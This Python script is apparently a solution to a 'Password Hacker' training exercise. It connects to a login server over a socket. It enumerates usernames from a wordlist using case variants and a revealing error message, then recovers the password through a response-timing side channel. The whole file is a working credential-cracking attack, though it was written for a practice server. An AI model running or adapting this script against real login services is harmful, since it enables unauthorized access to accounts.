# write your code here
import sys
import socket
from itertools import product
from json import dumps, loads
import string
from datetime import datetime
import operator


def read_list_from_file(path):
    list_from_file = []
    with open(path, 'r') as file:
        for line in file:
            list_from_file.append(''.join(line.split()))
    return list_from_file


def get_login(socket, path):
    request = {
        'login': ' ',
        'password': ' '
    }
    typical_logins = read_list_from_file(path)
    for login in typical_logins:
        all_combinations = list(map(''.join, product(*zip(login.upper(), login.lower()))))
        for variant in all_combinations:
            request['login'] = variant
            socket.send(dumps(request).encode())
            response = loads(socket.recv(1024).decode())
            if response['result'] == 'Wrong password!':
                return request['login']


def main(ip_address, port):
    request = {
        'login': ' ',
        'password': ' '
    }
    logins_path = r'E:\JetBrainsAcademy\Password Hacker\Password Hacker\task\hacking\logins.txt'
    alphabet = string.ascii_letters + string.digits
    with socket.socket() as client_socket:
        client_socket.connect((ip_address, port))
        request['login'] = get_login(client_socket, logins_path)
        variant = ''
        delays_dict = {}
        while True:
            for char in alphabet:
                request['password'] = variant + char
                start = datetime.now()
                client_socket.send(dumps(request).encode())
                response = loads(client_socket.recv(1024).decode())
                delays_dict[char] = (datetime.now() - start)
                if response['result'] == 'Connection success!':
                    print(dumps(request, indent=4))
                    return
            variant += max(delays_dict.items(), key=operator.itemgetter(1))[0]
            delays_dict.clear()


if __name__ == '__main__':
    args = sys.argv
    ip = args[1]
    port_number = int(args[2])
    main(ip, port_number)
